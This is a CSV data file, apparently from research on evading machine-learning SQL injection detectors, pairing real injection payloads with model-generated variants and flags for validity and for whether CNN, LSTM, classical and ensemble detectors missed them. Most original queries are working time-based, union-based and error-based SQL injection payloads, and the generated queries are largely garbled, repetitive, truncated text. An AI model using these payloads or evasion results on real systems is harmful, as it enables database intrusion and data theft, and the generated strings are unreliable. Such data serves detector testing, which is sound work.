original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,SELECT SELECT DISTINCT esq injection detection FROM SQL SELECT SELECT DISTINCT esq injection detection FROM SELECT SELECT esq_injection FROM SELECT SELECT esq_injection FROM SQL WHERE 5271 = 5271 AND waitfor delay '0:0:5'-- for',1,1,0,1,1,1,0
1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',SELECT DISTINCT'sq injection' FROM SQL SELECT DISTINCT'sq injection' FROM query:'sq injection detection',1,0,1,1,1,1,1
select case when 6555  =  7349 then 1 else null end--,"SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(1 AND 1 AND NOT SELECT SELECT MIN(sql end--) FROM SQL SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql end--"" FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql end--"" FROM SQL SELECT SELECT MIN(sql) FROM SELECT SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(1 AND 1",1,1,1,0,1,1,0
"1 where 4448  =  4448 union all select null,null,null,null,null#","SELECT MIN(sql injection) FROM SQL JOIN null,null,null,null# FROM SQL JOIN detection of this SQL JOIN null,null,null,null,null# FROM SQL JOIN null,null,null,null# FROM SQL JOIN null,null,null,null# FROM SQL JOIN null,null = 4448 = 4448 = 4448",0,1,1,0,0,0,0
1'||  (  select 'hafu' where 6226  =  6226,SELECT SELECT 'hafu' FROM SQL injection',1,0,1,1,1,1,1
1'+  (  select mfcd where 6757  =  6757 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',SELECT MIN(sql injection) FROM SQL_injection WHERE 6757 = 6757 AND 4386 = utl_inaddr.inaddr.chr ( 112 ) ||chr ( 112 ) AND NOT mfcd = 6757 AND NOT mfcd = 6757 AND NOT mfcd = 'utl_inaddr.inaddr.chr ( 4386 = 4386),1,1,0,0,0,0,0
1'  )   where 2852  =  2852,SELECT MIN(2852 = 2852) FROM SQL injection detection,1,0,1,1,1,1,1
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection'",1,1,0,0,1,0,0
select   (  case when   (  1898  =  4705  )   then 1898 else 1/  (  select 0  )   end  )  --,SELECT MIN(SELECT 0 FROM SQL injection detection) FROM SQL SELECT MIN(SELECT 0 FROM SQL SELECT 0 FROM SQL,1,1,1,1,1,1,1
1   )    )    as svhd where 9761  =  9761,SELECT MIN(svhd) FROM svhd WHERE NOT SQL_injection = 9761,1,0,1,1,1,1,1
"-1868   )    )    union all select 1859,1859--","SELECT MIN(1859,1859--) FROM SQL injections WHERE NOT SELECT MIN(1859 - 58 - 58) FROM SQL_Injection",1,1,1,1,1,1,1
"1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN sysibm.systables as t3 ON sysibm.systables = t2.sysibm.systables as t3 JOIN sysibm.systables as t1,sysibm.systables as t3 = 8189",1,1,0,0,0,0,0
"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv","SELECT MIN(""mcyv"") FROM SQL injection detection",1,0,1,0,1,1,0
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',"SELECT MIN(sql injection) FROM SQL injection detection WHERE ""3337 = 3337 rlike sleep ( 5 )||"" = ""sql injection""",1,1,0,0,0,0,0
"-3270"" where 2144  =  2144 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",SELECT DISTINCT t1.case FROM SQL_injection_methods AS t1 JOIN 244 = 212 ORDER BY t2.2724 = 224 OR t2.2724 = 2724 OR t2.113 ) +char ( 113 ) +char ( 113 ) +char ( 113 ) +char ( 113 ) FROM SQL injection detection) AS t1 JOIN (SELECT SUM(SQL) FROM SQL) AS t2 ON t1.sequence) FROM t2.SELECT t1.case FROM t2.SELECT t1.case FROM t2. +char ( +char ( 113 ) +char ( +char ( 113 ) +char ( +char ( 113 ) +char ( 113 ) +char ( 113 ) +char ( 113 ) +char ( 113 ) FROM t2. SELECT t1.case FROM t2. t2. t2. t2. t2. t2. t2. t2. t2. t2. t2. t2. ,0,1,0,0,0,0,0
-9700'  )   or 8811  =  7862,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM Query: -9700' OR 8811 = 7862,1,1,1,1,1,1,1
"1  )   as wbcd where 9506  =  9506 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",SELECT MIN(selection) FROM SQL injection - SELECT MIN(selection) FROM SQL - SELECT MIN(selection) FROM SQL - SELECT MIN(selection) FROM SQL - SELECT MIN(selection) FROM x GROUP BY x,1,1,0,1,1,1,0
"1'  )   as bagi where 1281  =  1281   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT char( 5451 = 5451) AND NOT char( 5451 = 5451 ORDER BY char( 5451),1,1,0,0,0,0,0
1   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   7594  =  7594,SELECT DISTINCT (SQL injection) FROM SQL SELECT MIN(SQL injection) FROM SQL),1,0,1,1,1,1,1
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""rsru""  =  ""rsru","SELECT 6969 FROM pg_sleep WHERE NOT rsru = ""rsru"" AND NOT rsru = ""sq injection detection""",1,0,1,0,1,1,0
"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SELECT MIN(5000000,md5 ( 0x6d457153 ) FROM SQL injections WHERE NOT ms injection ='sql injection' AND NOT md5 ( 5000000,md5 ( 0x6d457153 ) = '2388 = benchmark'",1,1,0,0,0,0,0
"1' where 9961  =  9961 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection detection WHERE 9961 = 9961 AND 8514 = (SELECT MIN(*) FROM SQL injection detection),1,1,1,0,1,1,0
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'yvxg'  =  'yvxg,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection JOIN (SELECT SUM(sqlid_to_sqlhash) FROM dbms_utility.sqlid_to_sqlhash) AND 7756 = 7756 = 'dbms_utility.sqlid_to_sqlhash'),0,1,0,0,0,0,0
1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '%'  =  ',SELECT 6969 FROM pg_sleep WHERE NOT i_sq_injection ='sq injection' ORDER BY i_sleep ( 5 ),1,1,0,1,0,0,0
"-3420 where 9681  =  9681 or make_set  (  2438  =  1977,1977  )  --","SELECT * FROM query: -3420 WHERE 9681 = 9681 OR make_set = 2438 = 1977,1977 )",1,0,0,0,0,0,0
1'   )    )    as vrwr where 3830  =  3830,SELECT DISTINCT esq injection detection FROM SQL SELECT vrwr WHERE 3830 = 3830,1,0,1,1,0,1,0
"1""  )   where 1833  =  1833",SELECT MIN(1833 = 1833) FROM SQL injection detection,1,0,1,1,1,1,1
"1'+  (  select aahc where 5436  =  5436 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'","SELECT aahc FROM SQL injection_description WHERE 5436 = 5436 AND 3824 = benchmark (5000000,md5 ( 0x76555642 ) +')",0,1,0,0,0,0,0
"1%""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""%""  =  ""","SELECT DISTINCT 8403 = 8403,8899 ) FROM SQL injection detection",1,0,0,1,0,0,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'uqyt'  =  'uqyt",SELECT MIN(sql) FROM SQL_injection) AND NOT char( 5451 = 5451 - 5451 = 5451 - SELECT MIN(sql) FROM query_schema.system_users) FROM SQL_injection,1,1,1,0,0,0,0
"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",SELECT MIN(6055 ='sq injection') FROM SQL SELECT MIN(6055 = 9842 = 9842 AND 6055 = ctxsys.drithsx.sn ( 6055) ||chr ( 113 )||chr ( 113 ) FROM SELECT MIN(6055) FROM SQL injection detection) FROM SQL SELECT MIN(6055 = 9842 = 9842 AND 9842 = 113 ) ||chr ( 6055 = 105 / 105 / XXSYS.DIR (SELECT MIN(6055 ='sq injection') FROM ctxsys.drithsx.sn ( 6055 = 113 ) ||chr ( 6055 = 113 ),1,1,0,0,0,0,0
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL,1,1,1,1,1,1,1
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ","SELECT MIN(1210 = 1210,sleep ( 5 ) FROM SQL injection detection) FROM SQL injection detection",1,1,0,0,1,0,0
"1'+  (  select 'ewlk' where 1078  =  1078 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",SELECT MIN(*) FROM SQL_Injection WHERE 1078 = 1078 AND 2716 = 1078,1,1,0,0,0,0,0
"1%"" union all select null#","SELECT MIN(sql injection) FROM SQL SELECT SELECT DISTINCT eject FROM SQL SELECT SELECT eject FROM query: 1%"" union All select null# FROM query: 'yes'",1,0,0,1,1,1,0
"1""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""qqky"" like ""qqky",SELECT MIN(sqqky) FROM SQL injection detection) AND 6537 = dbms_pipe.receive_message (SELECT chr ( 76 ) ||chr ( 65 ) FROM dbms_pipe.receive_message) FROM SQL injection,1,1,0,0,1,0,0
-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,"SELECT MIN(sql injection) FROM SQL_inaddr.get_host_address WHERE NOT chr = 4493 OR 4493 = ""utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr (113 ) ||chr ( SELECT MIN(sql_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inadd",0,1,0,0,1,0,0
"1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE 7023 = 7023 AND all_users = 7023 AND 5556 = (SELECT SUM(*) FROM SQL),1,1,0,0,0,0,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'hube'  =  'hube",SELECT * FROM SQL injection detection WHERE NOT all_users IN (SELECT all_users FROM SQL injection detection),1,0,1,1,1,1,1
"-5150   )    )     )   union all select 5660,5660,5660#","SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(5660,5660,5660,5660,5660,5660,5660,5660,5660,5660 FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT ",1,1,1,1,1,1,1
"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN 7417 = sysibm.systables as t2,sysibm.systables as t3 JOIN SELECT MIN(*) FROM SQL JOIN sysibm.systables as t2,sysibm.systables as t3 JOIN sysibm.systables as t3 ON sysibm.systables as t3 WHERE sysibm.systables = ""SQ injection""",1,1,0,0,0,0,0
-9650'  )   or 1390  =  3209,SELECT MIN(1390 = 3209) FROM SQL injection detection,1,0,1,1,1,1,1
-3582'  )   or 6872  =  6872 and   (  'gyfj'  =  'gyfj,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1'||  (  select 'zbdv' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'bzak' like 'bzak","SELECT MIN(*) FROM SQL injection detection) FROM SELECT DISTINCT ecupressure FROM SELECT ecupressure_injection, COUNT(*) FROM generate_series WHERE NOT'sq injection' ='sq injection'",1,0,0,0,1,0,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  '%'  =  '","SELECT * FROM SQL injection, COUNT(*) FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4 AND ((((((((() - %) FROM SQL injection)",0,1,0,0,0,0,0
-4900'   )    )    or 7208  =  3236,SELECT MIN(SQL) FROM SQL Injection) ORDER BY created LIMIT 1,1,0,1,1,0,1,0
1   )    )    as zldh where 3302  =  3302 rlike   (  select   (  case when   (  1481  =  5677  )   then 1 else 0x28 end   )    )   --,"SELECT MIN(1 AS _x28_end) FROM SQL injection_diagnosis WHERE ""3302 = 3302 = 3302 rlike (SELECT MIN(1481 = 5677)"" AND NOT i_solt = ""zldh""",0,1,0,0,0,0,0
"1'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'","SELECT * FROM SQL_Injections WHERE elt = 6922 AND NOT elt ( 9067 = 9067,1 - 1)",1,1,0,0,0,0,0
1'  )   as ulbr where 7233  =  7233 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
-5500'  )   order by 1--,SELECT MIN(sql injection) FROM SQL injection detection ORDER BY MIN(sql injection),1,0,1,1,1,1,1
"1'+  (  select 'mgrj' where 8514  =  8514 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'","SELECT MIN(success injection) FROM SQL - SELECT MIN(success injection) FROM SQL - SELECT MIN(success) FROM SQL - SELECT MIN(success) FROM SQL - SELECT MIN(success) FROM x WHERE 8514 = 8514 ORDER BY elt ( 1045,7562)",1,1,0,0,1,0,0
"-9988%"" or elt  (  1032  =  1032,3623  )   and ""%""  =  ""","SELECT MIN(1032 = 1032,3623 ) FROM SQL injection detection",1,1,0,0,1,0,0
"1"" where 4161  =  4161 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL JOIN, table_by_search: 1"" AND table_by_write ( 'abcdefg',upper ( hex ( randomblob ( 500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000/2 ) ='sql')",0,1,0,0,1,0,0
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--","SELECT MIN(sql injection) FROM SQL -2602' union All select 5715,5715,5715,5715,5715,5715,5715-- if you are done, terminated FROM SQL SELECT MIN(sql injection) FROM SQL Query: -2602' union All select 5715,5715,5715,5715,5715,5715,5715-- SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL Query: -2602' union All select '5715,5715,5715,5715,5715",1,1,0,0,1,0,0
1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,SELECT MIN(SQL injection) FROM SQL SELECT MIN(3423 = 7789) *7789 AND 'pdia' = 'pdia',1,1,0,0,0,0,0
"iif  (  4436  =  8910,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
"1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'","SELECT MIN(sql) FROM SQL injection_detective WHERE 9279 = 9279 AND extractvalue (7982,concat ( 0x5c,0x7171706a71 ) ='sql injection'",1,1,0,0,0,0,0
select   (  case when   (  3336  =  9781  )   then 3336 else 1/  (  select 0  )   end  )  --,SELECT MIN(SELECT 0 FROM SQL injection detection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
-1021  )   as erjh where 7845  =  7845 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection JOIN 7845 = 7845 OR 4747 = dbms_utility.sqlid_to_sqlhash ((chr) ||chr ( 112 ) FROM sqlid_to_sqlhash),0,1,0,0,0,0,0
"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '%'  =  '","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL injection detection)",1,1,0,0,1,0,0
-7034'   )    )     )   union all select 4023#,SELECT 4023# FROM SQL injection detection,1,0,1,1,1,1,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lijy'  =  'lijy","SELECT MIN(5000000,md5 ( 0x4c4d6142 ) FROM benchmark WHERE NOT md5 = 'valid' AND ((((((() - 'lijy') = 'lijy')",1,1,0,0,0,0,0
"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection) FROM SELECT SELECT DISTINCT num(*) FROM generate_series WHERE 5575 = 5575 OR 5575 = 5575 OR 8421 = (SELECT MIN(1,5000000) FROM generate_series) FROM SELECT MIN(1,5000000) FROM SQL_injection)",1,1,0,0,0,0,0
"1%"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN detection of SQL injection detection' FROM sysibm.systables as t2,sysibm.systables as t3 JOIN SELECT MIN(*) FROM SQL JOIN sysibm.systables as t2,sysibm.systables as t3 WHERE NOT sysibm.systables as t3  (SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 FROM SQL JOIN sysibm.systables as t3 ON sysibm.systables as",1,1,0,0,0,0,0
select   (  case when   (  8350  =  7872  )   then 8350 else 8350*  (  select 8350 from information_schema.character_sets  )   end  )  #,"SELECT 8350 FROM SQL AS _valid_sQCH_CHLD_0, 8350 FROM * WHERE NOT * * = ""SQL"" AND NOT * 365_US_0, 8350** (SELECT 8350 FROM information_schema.character_sets ) end )",1,1,0,1,1,1,0
"-4287%""   )    )    union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,9074,90",1,1,1,0,0,0,0
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,SELECT MIN(sdo ) FROM SQL injection detection) FROM SQL SELECT MIN(sdo) FROM SQL,1,0,1,1,1,1,1
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL injection detection = 'evade SQL injection',1,0,1,1,1,1,1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ctdc""  =  ""ctdc",SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL injection detection = 'evade SQL injection',1,0,1,1,1,1,1
"1%"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(selection) FROM SQL injection detection WHERE NOT SQL injection detection = 'SQ' AND domain.domain.columns = 't2, domain.tables as t3'",1,1,1,0,0,0,0
select   (  case when   (  8362  =  7572  )   then 8362 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
"1"" where 2886  =  2886",SELECT MIN(2886 = 2886) FROM SQL injection detection,1,0,0,0,1,0,0
"1' where 6417  =  6417 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection detection WHERE 6417 = 6417 OR NOT char(117 ) ||char ( 105 ) ||char ( 100 ),1,1,0,0,0,0,0
-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',SELECT MIN(*) FROM SQL injection detection WHERE NOT'sq injection detection',1,0,1,1,1,1,1
"1%""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""%""  =  ""","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection detection) AND NOT (((((((((((((((((()) FROM SQL injection)",1,1,0,0,1,0,0
"1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'","SELECT 'qzcx' FROM SQL SELECT MIN(9524 = 9524 AND NOT SELECT 'qzcx' FROM SELECT SELECT 'qzcx' FROM SELECT SELECT 'elt ( 3069 = 8430,8430 ) +' FROM SQL injection detection'",1,1,0,0,1,0,0
"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","SELECT 0x5c, MIN(excat) FROM SQL, MIN(excat) FROM 8734 = 8734",1,1,1,0,1,1,0
"1%""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
